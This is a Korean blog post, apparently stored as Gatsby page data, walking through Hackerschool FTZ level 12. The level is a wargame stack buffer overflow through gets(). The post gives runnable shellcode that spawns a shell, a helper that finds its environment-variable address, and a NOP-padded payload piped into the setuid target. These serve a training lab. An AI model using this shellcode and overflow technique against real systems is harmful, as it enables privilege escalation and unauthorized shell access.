{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221002/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. <strong>들어가기 전에</strong></h3>\n<p>이것 또한 기본 BOF문제라고 할 수 있겠다. 11번과 다른 점은 gets를 사용한다는 점이다.</p>\n<h3>1. <strong>Level 12</strong></h3>\n<p>접속하면 AttackMe 실행파일이 존재한다. 소스코드를 확인해보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">#include &lt;stdio.h>\r\n#include &lt;stdlib.h>\r\n#include &lt;unistd.h>\r\n\r\nint main( void )\r\n{\r\n        char str[256];\r\n\r\n        setreuid( 3093, 3093 );\r\n        printf( \"문장을 입력하세요.\\n\" );\r\n        gets( str );\r\n        printf( \"%s\\n\", str );\r\n}</code></pre></div>\n<p>레벨 11과 다를 것 없는 구조다. 다른 점은 gets(str)을 이용해 입력을 받는다는 사실.\r\ngets()는 정말 위험한 함수니 내가 프로그래밍 할땐 절대 사용하지 않도록 해야겠다…</p>\n<p><strong>&#x3C;환경변수 등록></strong></p>\n<p>쉘코드는 4바이트짜리 return 에 들어가기는 너무 길다. 따라서 우린 “환경 변수\"\" 라는 친구를 만들어서 그 친구의 주소를 파악한 다음, 그 주소를 return 주소로 넘기도록 하겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">export SHELLCODE=$(python -c 'print \"\\x31\\xc0\\xb0\\x31\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x31\\xc0\\xb0\\x46\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\"') \r\n//환경변수 등록</code></pre></div>\n<p>쉘코드는 인터넷에서 카피해오는게 제일 빠르다..</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">int main(){ //get.c\r\n        printf(\"%p\\n\", getenv(\"SHELLCODE\"));\r\n        return 0;\r\n}\r\n//쉘코드의 위치를 알려줄 함수 작성</code></pre></div>\n<p>c파일을 gcc로 컴파일 했으면 실행해보자. 다음과 같은(유사한) 결과를 얻을 것이다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">./get => 0xbffffc8d</code></pre></div>\n<p>이제 이 주소를 little endian x90형식으로 변환시키면 된다. 이 경우에는 <strong>\\x8d\\xfc\\xff\\xbf</strong> 가 될 것이다. 그럼 이제 이 값을 return주소에 넣어주면 된다.</p>\n<p><strong>&#x3C;버티컬바 ”|” 실행></strong></p>\n<p>버티컬바 하나는 앞의 명령어 실행 결과를 뒤의 명령어의 입력으로(!) 넘긴다.\r\n물론 먼저 attackme를 실행한 후 268개의 문자를 일일히 타자로 쳐도 되겠지만(…) 너무 귀찮은 작업이니 python -c를 사용하기 위해  cat으로 문장을 입력받은 다음 버티컬 바를 이용해서 이를 매개변수로 넘겨주도록 하자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\"\\x90\"*268+\"\\x8d\\xfc\\xff\\xbf\r\n (python -c 'print\"\\x90\"*268+\"\\x8d\\xfc\\xff\\xbf\"'; cat) | ./attackme</code></pre></div>\n<p>비밀번호 : have no clue</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"해커스쿨 FTZ 레벨 12","summary":"","date":"2022.10.02.","before":"2022.10.01.","after":"2022.10.03.","categories":["KOR","pwn"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVVkeVbX188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwERBBMSACExkdL/2gAIAQMBAT8B2ilGRqfkmnJaO5BG2Fm7EEBS+Rl5DcJ1Lio5UF8u9RLSvwPufnr/xAAeEQACAgICAwAAAAAAAAAAAAACAwEEEiEAEyIx0f/aAAgBAgEBPwGsMuOvJoqKdUSa02ASruFNphvYnsFMEQTYJzZgvHNpzjM7LvZGsla16P5z/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIDBBIABRETISIxQRQVIzKSoeH/2gAIAQEABj8Cr8omzfNjSx0cVDkTQ1ctNLk8805aGopgwe2jCPUeqprZBLtoiABi49xzLNBmMiyVFOlaqho6iOCd13t5eH3VtdLF05PQCcctz56Tx+sEaq61NHJQkSC/bjHzI8Wv1lR06X72ySL2Y42nGqqblFzWp5NijQKWJBJHkdscKfy/mP/EAB0QAQADAAIDAQAAAAAAAAAAAAEAESFBUTFhcYH/2gAIAQEAAT8hzE24tLQPVhJNJSUr0wCVxU0kcX1weVyNLTnpyNwLOBO6TwpZRaBNbsWfuEhKrYwKf3z+J//aAAwDAQACAAMAAAAQkN//xAAaEQEAAgMBAAAAAAAAAAAAAAABETEAIaFh/9oACAEDAQE/EEyD5/zMnaTFJWUhNy32jxPPc//EABoRAQACAwEAAAAAAAAAAAAAAAERMQAhQZH/2gAIAQIBAT8QEX6POL11GhsyL86M8GpYB4FVWf/EABgQAQEBAQEAAAAAAAAAAAAAAAERIQAx/9oACAEBAAE/EJoUOgd33xFiGjvwLQjW8KY0zoweyIVAKQD6LTn7qVBNlE8EIiuUSHK55IjERS7B4w67dNSnsqKzV7//2Q=="},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221002/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}